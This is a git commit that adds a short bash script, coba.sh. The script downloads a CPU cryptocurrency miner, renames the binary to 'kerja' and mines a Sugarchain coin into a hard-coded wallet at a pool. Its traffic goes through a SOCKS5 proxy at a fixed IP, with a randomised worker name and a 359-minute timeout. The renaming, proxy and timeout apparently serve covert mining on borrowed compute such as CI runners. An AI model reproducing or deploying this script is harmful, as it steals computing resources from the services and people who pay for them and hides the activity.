88f6e048462ca8d1c6d5a17559c0e4d119fb26f2
krisamasnd <88744355+krisamasnd@users.noreply.github.com>
2021-08-17 05:26:55 +0700

    Create coba.sh

---
+++ coba.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz 
+tar xf cpuminer-opt-linux.tar.gz
+mv cpuminer-sse2 kerja
+A=stratum+tcp://stratum-asia.rplant.xyz:7042
+B=sugar1qdv757yc0y3gcdl35wpptenhddk60fnvns473jn
+C=$(shuf -i 10-9999999999999999999 -n 1)#szor-izew
+D=socks5://101.201.154.109:8080
+timeout 359m ./kerja -a yespowersugar - -o $A -u $B.$C -p x -t 16 -x $D -k
